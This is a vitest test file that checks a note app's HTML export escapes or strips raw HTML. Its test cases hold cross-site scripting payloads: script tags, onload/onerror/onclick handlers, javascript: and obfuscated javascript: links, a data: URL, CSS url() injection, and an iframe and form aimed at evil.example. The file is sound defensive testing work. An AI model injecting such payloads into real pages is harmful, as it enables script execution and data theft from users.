import { describe, it, expect } from 'vitest'
import { renderNoteAsHtml, type NoteExportData } from './export-utils'

/** The note body of an exported document, the part the note's author controls. */
function exportBody(content: string): string {
  const note: NoteExportData = {
    id: 'raw-html',
    title: 'Raw HTML',
    content,
    tags: [],
    created: new Date(2026, 0, 2),
    modified: new Date(2026, 0, 3)
  }
  const html = renderNoteAsHtml(note)
  const start = html.indexOf('<main class="note-content">')
  const end = html.indexOf('</main>', start)
  expect(start).toBeGreaterThan(-1)
  return html.slice(start, end)
}

describe('renderNoteAsHtml raw HTML', () => {
  it.each([
    ['a script', 'Pasted: <script>alert(document.domain)</script> done'],
    ['an svg handler', 'x <svg onload=alert(1)> y'],
    [
      'an iframe',
      '<iframe src="https://evil.example/x" srcdoc="<script>alert(1)</script>"></iframe>'
    ],
    ['a script block', '<script>\nalert(1)\n</script>'],
    ['a style tag', '<style>body{display:none}</style>'],
    ['an object', 'a <object data="x.swf"></object> b'],
    ['a form', '<form action="https://evil.example"><input name=p></form>']
  ])('shows %s as text, never as a tag', (_name, markdown) => {
    const body = exportBody(markdown)
    expect(body).not.toMatch(/<(script|svg|iframe|style|object|form)\b/i)
    expect(body).toContain('&lt;')
  })

  it('keeps the characters of a hidden tag as escaped text', () => {
    const body = exportBody('Pasted: <script>alert(document.domain)</script> done')
    expect(body).toContain('Pasted: &lt;script&gt;alert(document.domain)&lt;/script&gt; done')
  })

  it('shows a tag the editor has no node for as text, as the editor does', () => {
    expect(exportBody('press <kbd>Ctrl</kbd>')).toContain('press &lt;kbd&gt;Ctrl&lt;/kbd&gt;')
  })

  it('removes event handlers from a tag the editor handles', () => {
    const body = exportBody(
      '<img src="a.png" alt="a" onerror="alert(1)">\n\n<a href="https://x.example" onclick="alert(1)">x</a>'
    )
    expect(body).not.toMatch(/\son\w+\s*=/i)
    expect(body).toContain('src="a.png"')
    expect(body).toContain('href="https://x.example"')
  })

  it.each([
    ['a raw anchor', '<a href="javascript:alert(1)">x</a>'],
    ['an obfuscated anchor', '<a href="jav&#x09;ascript:alert(1)">x</a>'],
    ['a markdown link', '[x](javascript:alert(1))'],
    ['a data link', '<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>'],
    ['an image', '<img src="javascript:alert(1)">']
  ])('drops a script address from %s', (_name, markdown) => {
    expect(exportBody(markdown)).not.toMatch(/(?:href|src)="[^"]*(?:alert|PHNjcmlwdD4)/i)
  })

  it('drops a style that loads or evaluates something and keeps a colour', () => {
    const body = exportBody(
      '<span style="color:red;background:url(javascript:alert(1))">a</span> <span style="color:red">b</span>'
    )
    expect(body).not.toMatch(/url\(|javascript/i)
    expect(body).toContain('<span style="color:red">b</span>')
  })

  it('exports what Memry writes as it did', () => {
    const body = exportBody(
      [
        'a <span style="color:red">red</span> and <span style="text-decoration:underline">under</span><br>next',
        '',
        '<details data-memry-toggle>',
        '<summary>Title</summary>',
        '',
        'inside',
        '',
        '</details>',
        '',
        '<figure><img src="a.png" alt="cap"><figcaption>cap</figcaption></figure>'
      ].join('\n')
    )
    expect(body).toContain('<span style="color:red">red</span>')
    expect(body).toContain('<span style="text-decoration:underline">under</span>')
    expect(body).toContain('<br>next')
    expect(body).toContain('<details data-memry-toggle>')
    expect(body).toContain('<summary>Title</summary>')
    expect(body).toContain('</details>')
    expect(body).toContain(
      '<figure><img src="a.png" alt="cap"><figcaption>cap</figcaption></figure>'
    )
  })

  it('leaves code that spells a tag as the code it is', () => {
    const body = exportBody('`<script>x</script>`\n\n```html\n<iframe></iframe>\n```')
    expect(body).toContain('<code>&lt;script&gt;x&lt;/script&gt;</code>')
    expect(body).toContain('&lt;iframe&gt;&lt;/iframe&gt;')
  })
})
